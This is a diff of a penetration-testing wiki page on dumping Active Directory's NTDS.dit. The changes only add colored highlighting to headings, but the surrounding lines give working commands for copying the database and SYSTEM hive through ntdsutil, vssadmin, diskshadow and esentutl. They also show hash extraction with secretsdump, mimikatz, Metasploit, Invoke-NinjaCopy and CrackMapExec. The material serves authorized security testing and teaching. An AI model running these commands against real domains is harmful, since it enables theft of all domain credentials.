@@ -12,7 +12,7 @@ SD Table: Contains the security descriptors of each object
 
 Windows uses Ntdsa.dll to interact with that file and its used by lsass.exe. Then, part of the NTDS.dit file could be located inside the lsass memory (you can find the lastet accessed data probably because of the performance impruve by using a cache).
 
-## Decrypting the hashes inside NTDS.dit
+## <mark style="color:red;">Decrypting the hashes inside NTDS.dit</mark>
 
 You will need the following files to extract the ntds :
 
@@ -40,7 +40,7 @@ Decrypt the hash using DES.
 
 PEK have the same value in every domain controller, but it is cyphered inside the NTDS.dit file using the BOOTKEY of the SYSTEM file of the domain controller (is different between domain controllers). This is why to get the credentials from the NTDS.dit file you need the files NTDS.dit and SYSTEM (C:\Windows\System32\config\SYSTEM).
 
-### Copying NTDS.dit using Ntdsutil
+### <mark style="color:orange;">Copying NTDS.dit using Ntdsutil</mark>
 
 Available since Windows Server 2008.
 
@@ -60,7 +60,7 @@ ifm: quit
 ntdsutil: quit
 ```
 
-## Vshadow
+## <mark style="color:red;">Vshadow</mark>
 
 You could also use the volume shadow copy trick to copy the ntds.dit file. Remember that you will also need a copy of the SYSTEM file (again, dump it from the registry or use the volume shadow copy trick).
 
@@ -77,7 +77,7 @@ Copy-VSS
 Copy-VSS -DestinationDir C:\ShadowCopy\
 ```
 
-### **Using vssadmin**
+### <mark style="color:orange;">**Using vssadmin**</mark>
 
 ```
 vssadmin create shadow /for=C:
@@ -85,7 +85,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Sh
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
 ```
 
-### **Using DiskShadow (a Windows signed binary)**
+### <mark style="color:orange;">**Using DiskShadow (a Windows signed binary)**</mark>
 
 ```
 diskshadow.txt contains :
@@ -104,7 +104,7 @@ dir c:\exfil
 reg.exe save hklm\system c:\exfil\system.bak
 ```
 
-### **Using esentutl.exe**
+### <mark style="color:orange;">**Using esentutl.exe**</mark>
 
 **​​**Copy/extract a locked file such as the AD Database
 
@@ -114,7 +114,7 @@ esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
 
 ***
 
-## Extracting hashes from NTDS.dit
+## <mark style="color:red;">Extracting hashes from NTDS.dit</mark>
 
 Once you have obtained the files NTDS.dit and SYSTEM you can use tools like secretsdump.py to extract the hashes:
 
@@ -122,7 +122,7 @@ Once you have obtained the files NTDS.dit and SYSTEM you can use tools like secr
 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -outputfile credentials.txt
 ```
 
-### remote NTDS.dit Dump
+### <mark style="color:orange;">remote NTDS.dit Dump</mark>
 
 You can also extract them automatically using a valid domain admin user:
 
@@ -135,7 +135,7 @@ secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 * `-pwd-last-set`: Shows pwdLastSet attribute for each NTDS.DIT account.
 * `-user-status`: Display whether or not the user is disabled.
 
-### Metasploit & Mimikatz Modules
+### <mark style="color:orange;">Metasploit & Mimikatz Modules</mark>
 
 Finally, you can also use the metasploit module:
 
@@ -144,20 +144,20 @@ post/windows/gather/credentials/domain_hashdump
 lsadump::lsa /inject
 ```
 
-### PowerSploit module
+### <mark style="color:orange;">PowerSploit module</mark>
 
 ```
 Invoke-NinjaCopy --path c:\windows\NTDS\ntds.dit --verbose --localdestination c:\ntds.dit
 ```
 
-### CrackMapExec module
+### <mark style="color:orange;">CrackMapExec module</mark>
 
 ```
 cme smb 10.10.0.202 -u username -p password --ntds vss
 cme smb 10.10.0.202 -u username -p password --ntds drsuapi #default
 ```
 
-### Mimikatz
+### <mark style="color:orange;">Mimikatz</mark>
 
 {% hint style="info" %}
 Dumps credential data in an Active Directory domain when run on a Domain Controller.
@@ -170,7 +170,7 @@ sekurlsa::krbtgt
 lsadump::lsa /inject /name:krbtgt
 ```
 
-## **Crack NTLM hashes with hashcat**
+## <mark style="color:red;">**Crack NTLM hashes with hashcat**</mark>
 
 Useful when you want to have the clear text password or when you need to make stats about weak passwords.
 
